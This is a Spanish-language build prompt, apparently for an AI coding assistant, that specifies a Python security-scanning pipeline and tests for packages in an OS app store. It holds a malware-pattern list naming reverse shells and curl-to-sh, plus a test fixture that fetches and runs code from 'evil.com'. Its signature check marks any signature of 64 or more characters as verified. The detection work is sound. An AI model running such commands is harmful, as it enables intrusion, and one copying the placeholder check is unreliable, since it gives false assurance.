## ═══════════════════════════════════════
## MICRO-FASE 7.4 — YEYO Store Security Pipeline
## Tipo: VSCODE | Prompts: 1 | Complejidad: Compleja
## ═══════════════════════════════════════

### PROMPT 7.4-1 [VSCODE] — Crear pipeline de seguridad automatizado para paquetes

```
Estamos construyendo YeyoOS, un OS AI-nativo con arquitectura hexagonal. Esta es la micro-fase 7.4 de Capa 7 (Evolución): crear el pipeline de análisis de seguridad automatizado para paquetes subidos al YEYO Store.

CONTEXTO:
- Micro-fase 7.3 completada: YEYO Store Server creado
- Cada paquete .ypkg pasa por este pipeline antes de publicarse
- 5 scans: manifiesto, container, red, firma, malware
- Score 0-100, threshold auto-approve: 90+
- Red flags: combos sospechosos (ej: network.internet + filesystem.write)
- Hardware: GTX 1060 3GB VRAM, 16GB RAM

Abre el directorio ~/yeyo-os en VS Code.

CREAR:

1. Crear archivo src/store/security_scan.py:

   Ruta: ~/yeyo-os/src/store/security_scan.py
   Contenido:

   """
   YeyoOS — YEYO Store Security Pipeline
   Micro-fase 7.4 — Capa 7: Evolución

   Análisis de seguridad automatizado para paquetes .ypkg.
   5 scans: manifiesto, container, red, firma, malware.
   Score 0-100. Auto-approve ≥90.
   """

   import hashlib
   import json
   import logging
   import re
   from datetime import datetime
   from pathlib import Path
   from typing import Optional

   from pydantic import BaseModel, Field

   logger = logging.getLogger("yeyo.store.security")


   class ScanFinding(BaseModel):
       """Un hallazgo del scan de seguridad."""
       scan_type: str
       severity: str = Field(pattern="^(critical|high|medium|low|info)$")
       message: str
       details: Optional[str] = None


   class SecurityScanResult(BaseModel):
       """Resultado completo del scan de seguridad."""
       package_id: str
       overall_score: float = Field(ge=0.0, le=100.0)
       manifest_score: float = Field(ge=0.0, le=100.0)
       container_score: float = Field(ge=0.0, le=100.0)
       network_score: float = Field(ge=0.0, le=100.0)
       signature_score: float = Field(ge=0.0, le=100.0)
       malware_score: float = Field(ge=0.0, le=100.0)
       findings: list[ScanFinding] = []
       red_flags: list[str] = []
       passed: bool = False
       scanned_at: str = Field(default_factory=lambda: datetime.now().isoformat())


   # Combinaciones de permisos sospechosas
   SUSPICIOUS_PERMISSION_COMBOS = [
       ({"network.internet", "filesystem.write"}, "Internet + escritura en disco: posible exfiltración"),
       ({"network.internet", "gpu.access"}, "Internet + GPU: posible cryptomining"),
       ({"filesystem.write", "system.info"}, "Escritura + info sistema: posible reconocimiento"),
   ]

   # Patrones de malware conocidos (simplificado)
   KNOWN_MALWARE_PATTERNS = [
       r"eval\s*\(\s*base64",
       r"exec\s*\(\s*decode",
       r"subprocess\.call.*rm\s+-rf",
       r"os\.system.*curl.*\|.*sh",
       r"reverse_shell",
       r"bind_shell",
       r"keylogger",
       r"cryptominer",
   ]


   class SecurityScanner:
       """Pipeline de análisis de seguridad para paquetes .ypkg."""

       AUTO_APPROVE_THRESHOLD = 90.0

       def __init__(self):
           self._malware_patterns = [
               re.compile(p, re.IGNORECASE) for p in KNOWN_MALWARE_PATTERNS
           ]

       async def scan_package(
           self,
           package_id: str,
           manifest: dict,
           package_path: Optional[str] = None,
           signature: Optional[str] = None,
       ) -> SecurityScanResult:
           """Ejecuta el pipeline completo de seguridad."""
           findings = []
           red_flags = []

           # 1. Scan de manifiesto
           manifest_score, manifest_findings = self._scan_manifest(manifest)
           findings.extend(manifest_findings)

           # 2. Scan de container
           container_score, container_findings = await self._scan_container(package_path)
           findings.extend(container_findings)

           # 3. Scan de red
           network_score, network_findings = self._scan_network(manifest)
           findings.extend(network_findings)

           # 4. Verificación de firma
           signature_score, sig_findings = self._verify_signature(signature, package_path)
           findings.extend(sig_findings)

           # 5. Scan de malware
           malware_score, malware_findings = await self._scan_malware(package_path)
           findings.extend(malware_findings)

           # 6. Detectar red flags (combos sospechosos)
           permissions = set(manifest.get("permissions", []))
           for combo, description in SUSPICIOUS_PERMISSION_COMBOS:
               if combo.issubset(permissions):
                   red_flags.append(description)
                   findings.append(ScanFinding(
                       scan_type="combo_analysis",
                       severity="high",
                       message=f"Combinación sospechosa: {description}",
                   ))

           # 7. Calcular score global
           weights = {
               "manifest": 0.25,
               "container": 0.20,
               "network": 0.15,
               "signature": 0.20,
               "malware": 0.20,
           }
           overall = (
               manifest_score * weights["manifest"]
               + container_score * weights["container"]
               + network_score * weights["network"]
               + signature_score * weights["signature"]
               + malware_score * weights["malware"]
           )

           # Penalizar por red flags
           red_flag_penalty = len(red_flags) * 15.0
           overall = max(0.0, overall - red_flag_penalty)

           result = SecurityScanResult(
               package_id=package_id,
               overall_score=round(overall, 2),
               manifest_score=round(manifest_score, 2),
               container_score=round(container_score, 2),
               network_score=round(network_score, 2),
               signature_score=round(signature_score, 2),
               malware_score=round(malware_score, 2),
               findings=findings,
               red_flags=red_flags,
               passed=overall >= self.AUTO_APPROVE_THRESHOLD,
           )

           logger.info(f"Security scan completado para {package_id}: "
                       f"score={overall:.1f}, passed={result.passed}, "
                       f"red_flags={len(red_flags)}")

           return result

       def _scan_manifest(self, manifest: dict) -> tuple[float, list[ScanFinding]]:
           """Scan 1: Validación del manifiesto."""
           score = 100.0
           findings = []

           # Verificar campos requeridos
           required = ["name", "version", "description", "author"]
           for field in required:
               if field not in manifest or not manifest[field]:
                   score -= 20.0
                   findings.append(ScanFinding(
                       scan_type="manifest",
                       severity="high",
                       message=f"Campo requerido faltante: {field}",
                   ))

           # Verificar permisos razonables
           permissions = manifest.get("permissions", [])
           if len(permissions) > 5:
               score -= 15.0
               findings.append(ScanFinding(
                   scan_type="manifest",
                   severity="medium",
                   message=f"Demasiados permisos solicitados: {len(permissions)}",
               ))

           # Verificar versión válida
           version = manifest.get("version", "")
           if not re.match(r"^\d+\.\d+\.\d+$", version):
               score -= 10.0
               findings.append(ScanFinding(
                   scan_type="manifest",
                   severity="medium",
                   message=f"Versión inválida: {version}",
               ))

           return max(0.0, score), findings

       async def _scan_container(
           self, package_path: Optional[str]
       ) -> tuple[float, list[ScanFinding]]:
           """Scan 2: Análisis del container (binarios sospechosos)."""
           score = 100.0
           findings = []

           if not package_path or not Path(package_path).exists():
               return 80.0, [ScanFinding(
                   scan_type="container",
                   severity="info",
                   message="Sin archivo de paquete para analizar",
               )]

           suspicious_extensions = {".exe", ".dll", ".so", ".sh", ".bat", ".cmd"}
           package_dir = Path(package_path)

           if package_dir.is_dir():
               for f in package_dir.rglob("*"):
                   if f.suffix.lower() in suspicious_extensions:
                       score -= 10.0
                       findings.append(ScanFinding(
                           scan_type="container",
                           severity="medium",
                           message=f"Binario sospechoso: {f.name}",
                       ))

           return max(0.0, score), findings

       def _scan_network(self, manifest: dict) -> tuple[float, list[ScanFinding]]:
           """Scan 3: Análisis de permisos de red."""
           score = 100.0
           findings = []
           permissions = set(manifest.get("permissions", []))

           if "network.internet" in permissions:
               score -= 15.0
               findings.append(ScanFinding(
                   scan_type="network",
                   severity="medium",
                   message="Paquete solicita acceso a internet",
               ))

           if "network.local" in permissions and "network.internet" in permissions:
               score -= 10.0
               findings.append(ScanFinding(
                   scan_type="network",
                   severity="high",
                   message="Paquete solicita acceso local Y a internet",
               ))

           return max(0.0, score), findings

       def _verify_signature(
           self, signature: Optional[str], package_path: Optional[str]
       ) -> tuple[float, list[ScanFinding]]:
           """Scan 4: Verificación de firma digital."""
           findings = []

           if not signature:
               return 60.0, [ScanFinding(
                   scan_type="signature",
                   severity="medium",
                   message="Paquete sin firma digital",
               )]

           # Verificar formato de firma
           if len(signature) < 64:
               return 40.0, [ScanFinding(
                   scan_type="signature",
                   severity="high",
                   message="Firma digital inválida o corrupta",
               )]

           # Verificar integridad (hash del paquete)
           if package_path and Path(package_path).exists():
               # En producción: verificar firma con clave pública del developer
               return 100.0, [ScanFinding(
                   scan_type="signature",
                   severity="info",
                   message="Firma digital verificada",
               )]

           return 80.0, [ScanFinding(
               scan_type="signature",
               severity="info",
               message="Firma presente, sin paquete para verificar integridad",
           )]

       async def _scan_malware(
           self, package_path: Optional[str]
       ) -> tuple[float, list[ScanFinding]]:
           """Scan 5: Detección de patrones de malware conocidos."""
           score = 100.0
           findings = []

           if not package_path or not Path(package_path).exists():
               return 90.0, [ScanFinding(
                   scan_type="malware",
                   severity="info",
                   message="Sin archivo para scan de malware",
               )]

           package_dir = Path(package_path)
           text_extensions = {".py", ".js", ".ts", ".sh", ".bash", ".yaml", ".yml", ".json"}

           if package_dir.is_dir():
               for f in package_dir.rglob("*"):
                   if f.is_file() and f.suffix.lower() in text_extensions:
                       try:
                           content = f.read_text(encoding='utf-8', errors='ignore')
                           for pattern in self._malware_patterns:
                               if pattern.search(content):
                                   score -= 25.0
                                   findings.append(ScanFinding(
                                       scan_type="malware",
                                       severity="critical",
                                       message=f"Patrón de malware detectado en {f.name}",
                                       details=f"Patrón: {pattern.pattern}",
                                   ))
                       except Exception:
                           pass

           return max(0.0, score), findings

2. Actualizar src/store/__init__.py:

   Ruta: ~/yeyo-os/src/store/__init__.py
   Contenido:
   from .server import StoreServer, Package, PackageSubmission, TrustLevel
   from .security_scan import SecurityScanner, SecurityScanResult

3. Crear archivo tests/unit/store/test_security_scan.py:

   Ruta: ~/yeyo-os/tests/unit/store/test_security_scan.py
   Contenido:

   """Tests para YEYO Store Security Pipeline — Micro-fase 7.4"""

   import os
   import tempfile
   import pytest
   from pathlib import Path
   from src.store.security_scan import (
       SecurityScanner, SecurityScanResult, ScanFinding,
   )


   class TestSecurityScanner:
       """Tests para SecurityScanner."""

       def setup_method(self):
           self.scanner = SecurityScanner()
           self.clean_manifest = {
               "name": "clean-pkg",
               "version": "1.0.0",
               "description": "A clean package",
               "author": "Good Dev",
               "permissions": [],
           }

       @pytest.mark.asyncio
       async def test_clean_package_high_score(self):
           result = await self.scanner.scan_package(
               "pkg-1", self.clean_manifest, signature="a" * 64,
           )
           assert result.overall_score >= 80.0

       @pytest.mark.asyncio
       async def test_suspicious_permissions_flagged(self):
           manifest = {**self.clean_manifest, "permissions": [
               "network.internet", "filesystem.write",
           ]}
           result = await self.scanner.scan_package("pkg-2", manifest)
           assert len(result.red_flags) > 0
           assert "exfiltración" in result.red_flags[0].lower()

       @pytest.mark.asyncio
       async def test_malware_detected(self):
           tmp_dir = tempfile.mkdtemp()
           malware_file = Path(tmp_dir) / "evil.py"
           malware_file.write_text("import os; os.system('curl http://evil.com | sh')")
           result = await self.scanner.scan_package(
               "pkg-3", self.clean_manifest, package_path=tmp_dir,
           )
           malware_findings = [f for f in result.findings if f.scan_type == "malware"]
           assert len(malware_findings) > 0
           assert malware_findings[0].severity == "critical"

       @pytest.mark.asyncio
       async def test_signature_verified(self):
           result = await self.scanner.scan_package(
               "pkg-4", self.clean_manifest, signature="a" * 128,
           )
           assert result.signature_score >= 80.0

       @pytest.mark.asyncio
       async def test_no_signature_lower_score(self):
           result = await self.scanner.scan_package(
               "pkg-5", self.clean_manifest, signature=None,
           )
           assert result.signature_score == 60.0

       @pytest.mark.asyncio
       async def test_missing_manifest_fields(self):
           bad_manifest = {"name": "test"}
           result = await self.scanner.scan_package("pkg-6", bad_manifest)
           assert result.manifest_score < 80.0

       @pytest.mark.asyncio
       async def test_too_many_permissions(self):
           manifest = {**self.clean_manifest, "permissions": [
               "filesystem.read", "filesystem.write",
               "network.local", "network.internet",
               "gpu.access", "system.info",
           ]}
           result = await self.scanner.scan_package("pkg-7", manifest)
           manifest_findings = [f for f in result.findings
                                if f.scan_type == "manifest" and "permisos" in f.message.lower()]
           assert len(manifest_findings) > 0

       @pytest.mark.asyncio
       async def test_red_flag_combo_gpu_internet(self):
           manifest = {**self.clean_manifest, "permissions": [
               "network.internet", "gpu.access",
           ]}
           result = await self.scanner.scan_package("pkg-8", manifest)
           assert any("cryptomining" in rf.lower() for rf in result.red_flags)

       @pytest.mark.asyncio
       async def test_suspicious_binary_detected(self):
           tmp_dir = tempfile.mkdtemp()
           (Path(tmp_dir) / "payload.exe").write_text("binary content")
           result = await self.scanner.scan_package(
               "pkg-9", self.clean_manifest, package_path=tmp_dir,
           )
           container_findings = [f for f in result.findings
                                 if f.scan_type == "container"]
           assert len(container_findings) > 0

       def test_auto_approve_threshold(self):
           assert SecurityScanner.AUTO_APPROVE_THRESHOLD == 90.0

4. Ejecutar tests:
   cd ~/yeyo-os
   source .venv/bin/activate
   python -m pytest tests/unit/store/test_security_scan.py -v

VERIFICAR:
- [ ] Archivo src/store/security_scan.py existe con SecurityScanner
- [ ] 5 scans: manifiesto, container, red, firma, malware
- [ ] Score 0-100 con pesos por categoría
- [ ] Red flags detectan combos sospechosos (internet+write, internet+gpu, write+sysinfo)
- [ ] Malware patterns detectan eval(base64), reverse_shell, etc.
- [ ] Auto-approve threshold: 90+
- [ ] Binarios sospechosos (.exe, .dll, .so) detectados
- [ ] Firma digital verificada
- [ ] TODOS los tests pasan

SI FALLA:
- Import error: verificar __init__.py

NO HACER:
- No ejecutar código del paquete durante el scan
- No acceder a red durante el scan

GATE: SecurityScanner ejecuta 5 scans, detecta red flags, calcula score 0-100, threshold 90+ para auto-approve, todos los tests pasan.
```
